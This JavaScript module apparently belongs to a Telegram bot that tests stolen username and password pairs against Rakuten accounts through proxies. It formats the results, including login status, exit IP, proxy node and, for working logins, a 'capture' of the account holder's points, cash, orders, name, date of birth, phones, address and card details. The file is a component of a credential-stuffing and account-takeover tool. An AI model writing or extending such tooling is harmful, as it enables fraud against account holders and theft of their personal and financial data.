/**
 * =============================================================================
 * CHECK MESSAGES - Single credential check related messages
 * =============================================================================
 */

const { escapeV2, codeV2, boldV2, spoilerCodeV2, italicV2 } = require('./helpers');

/**
 * Builds guard error message.
 * @param {string} message - Error message
 * @returns {string} Formatted error
 */
function buildGuardError(message) {
  return `❌ ${escapeV2(message)}`;
}

/**
 * Builds check queued message.
 * @returns {string} Queued message
 */
function buildCheckQueued() {
  return '⏳ ' + escapeV2('Checking credentials...');
}

/**
 * Builds check progress message.
 * @param {string} phase - Current phase
 * @returns {string} Progress message
 */
function buildCheckProgress(phase) {
  const map = {
    launch: '⏳ Initializing...',
    navigate: '🌐 Connecting to Rakuten...',
    email: '✉️ Verifying account...',
    password: '🔑 Authenticating...',
    analyze: '🔍 Analyzing response...',
    ip: '🌐 Detecting exit IP...',
    capture: '📊 Capturing data...',
  };
  return escapeV2(map[phase] || '⏳ Processing...');
}

/**
 * Builds check result message.
 * @param {Object} result - Check result
 * @param {string} username - Username
 * @param {number} durationMs - Duration
 * @param {string} password - Password
 * @param {string} [ipAddress] - Exit IP address
 * @param {Object} [processorInfo] - Processor info { name, proxy }
 * @returns {string} Result message
 */
function buildCheckResult(result, username = null, durationMs = null, password = null, ipAddress = null, processorInfo = null) {
  const statusEmoji = { VALID: '✅', INVALID: '❌', BLOCKED: '🔒', ERROR: '⚠️' };
  const statusLabel = {
    VALID: 'LOGIN SUCCESSFUL',
    INVALID: 'LOGIN FAILED',
    BLOCKED: 'ACCOUNT BLOCKED',
    ERROR: 'CHECK FAILED',
  };

  const emoji = statusEmoji[result.status] || '❓';
  const label = statusLabel[result.status] || result.status || 'UNKNOWN';

  const parts = [];
  
  parts.push(`${emoji} ${boldV2(label)}`);
  parts.push('');
  
  parts.push(boldV2('🔐 Credentials'));
  if (username) {
    parts.push(`├ User: ${codeV2(username)}`);
  }
  if (password) {
    parts.push(`└ Pass: ${spoilerCodeV2(password)}`);
  } else if (username) {
    parts.push(`└ Pass: ${codeV2('••••••••')}`);
  }

  if (ipAddress) {
    parts.push('');
    parts.push(boldV2('🌐 IP Address'));
    parts.push(`└ ${codeV2(ipAddress)}`);
  }

  // Processor info section
  if (processorInfo) {
    parts.push('');
    parts.push(boldV2('🖥 Processor'));
    parts.push(`├ Node: ${codeV2(processorInfo.name || 'unknown')}`);
    parts.push(`└ Proxy: ${codeV2(processorInfo.proxy || 'direct')}`);
  }

  if (durationMs != null) {
    parts.push('');
    const seconds = durationMs / 1000;
    const pretty = seconds >= 10 ? seconds.toFixed(1) : seconds.toFixed(2);
    parts.push(`⏱ ${codeV2(`${pretty}s`)}`);
  }

  return parts.join('\n');
}

/**
 * Builds unified check + capture result message.
 * @param {Object} result - Check result
 * @param {Object} capture - Captured account data
 * @param {string} username - Username
 * @param {number} durationMs - Duration
 * @param {string} password - Password
 * @param {string} [ipAddress] - Exit IP address
 * @param {Object} [processorInfo] - Processor info { name, proxy }
 * @returns {string} Combined result message
 */
function buildCheckAndCaptureResult(result, capture, username, durationMs, password = null, ipAddress = null, processorInfo = null) {
  const statusEmoji = { VALID: '✅', INVALID: '❌', BLOCKED: '🔒', ERROR: '⚠️' };
  const statusLabel = {
    VALID: 'LOGIN SUCCESSFUL',
    INVALID: 'LOGIN FAILED',
    BLOCKED: 'ACCOUNT BLOCKED',
    ERROR: 'CHECK FAILED',
  };
  
  const emoji = statusEmoji[result.status] || '❓';
  const label = statusLabel[result.status] || result.status;
  
  const parts = [];
  
  parts.push(`${emoji} ${boldV2(label)}`);
  parts.push('');
  
  // Account Data section (for valid)
  if (result.status === 'VALID' && capture) {
    parts.push(boldV2('📊 Account Data'));
    parts.push(`├ Points: ${codeV2(capture.points || '0')}`);
    parts.push(`├ Cash: ${codeV2(capture.cash || '0')}`);
    parts.push(`├ Rank: ${codeV2(capture.rank || 'n/a')}`);
    const orderDate = capture.latestOrder || 'n/a';
    const orderId = capture.latestOrderId || '';
    if (orderId && orderId !== 'n/a') {
      parts.push(`└ Last Order: ${codeV2(orderDate)} \\| ${codeV2(orderId)}`);
    } else {
      parts.push(`└ Last Order: ${codeV2(orderDate)}`);
    }
    parts.push('');
    
    // Profile section
    if (capture.profile) {
      const p = capture.profile;
      parts.push(boldV2('👤 Profile'));
      
      if (p.name) {
        const nameDisplay = p.nameKana ? `${p.name} (${p.nameKana})` : p.name;
        parts.push(`├ Name: ${codeV2(nameDisplay)}`);
      }
      if (p.dob) parts.push(`├ DOB: ${codeV2(p.dob)}`);
      
      const phones = [];
      if (p.mobilePhone) phones.push(`📱${p.mobilePhone}`);
      if (p.homePhone) phones.push(`☎${p.homePhone}`);
      if (p.fax) phones.push(`📠${p.fax}`);
      if (phones.length > 0) {
        parts.push(`├ Phone: ${spoilerCodeV2(phones.join(' '))}`);
      }
      
      const hasAddress = p.postalCode || p.state || p.city;
      const hasCards = p.cards && p.cards.length > 0;
      
      if (hasAddress) {
        const addr = [p.postalCode, p.state, p.city, p.addressLine1].filter(Boolean).join(' ');
        parts.push(`${hasCards ? '├' : '└'} Address: ${spoilerCodeV2(addr)}`);
      }
      
      if (hasCards) {
        p.cards.forEach((card, idx) => {
          const isLast = idx === p.cards.length - 1;
          const prefix = isLast ? '└' : '├';
          const cardInfo = [
            card.brand || '???',
            `••••${card.last4 || '????'}`,
            card.expiry ? `(${card.expiry})` : '',
            card.owner || '',
          ].filter(Boolean).join(' ');
          parts.push(`${prefix} 💳 ${spoilerCodeV2(cardInfo)}`);
        });
      } else if (!hasAddress) {
        const lastIdx = parts.length - 1;
        if (parts[lastIdx].startsWith('├')) {
          parts[lastIdx] = parts[lastIdx].replace('├', '└');
        }
      }
      parts.push('');
    }
  }
  
  // Credentials section
  parts.push(boldV2('🔐 Credentials'));
  if (username) {
    parts.push(`├ User: ${codeV2(username)}`);
  }
  if (password) {
    parts.push(`└ Pass: ${spoilerCodeV2(password)}`);
  } else if (username) {
    parts.push(`└ Pass: ${codeV2('••••••••')}`);
  }

  if (ipAddress) {
    parts.push('');
    parts.push(boldV2('🌐 IP Address'));
    parts.push(`└ ${codeV2(ipAddress)}`);
  }

  // Processor info section
  if (processorInfo) {
    parts.push('');
    parts.push(boldV2('🖥 Processor'));
    parts.push(`├ Node: ${codeV2(processorInfo.name || 'unknown')}`);
    parts.push(`└ Proxy: ${codeV2(processorInfo.proxy || 'direct')}`);
  }
  
  if (durationMs != null) {
    parts.push('');
    const seconds = durationMs / 1000;
    const pretty = seconds >= 10 ? seconds.toFixed(1) : seconds.toFixed(2);
    parts.push(`⏱ ${codeV2(`${pretty}s`)}`);
  }

  return parts.join('\n');
}

/**
 * Builds check error message.
 * @param {string} message - Error message
 * @returns {string} Error message
 */
function buildCheckError(message) {
  return (
    '⚠️ ' + boldV2('CHECK FAILED') +
    '\n\n' + escapeV2(message) +
    '\n\n' + italicV2('Please try again')
  );
}

module.exports = {
  buildGuardError,
  buildCheckQueued,
  buildCheckProgress,
  buildCheckResult,
  buildCheckAndCaptureResult,
  buildCheckError,
};
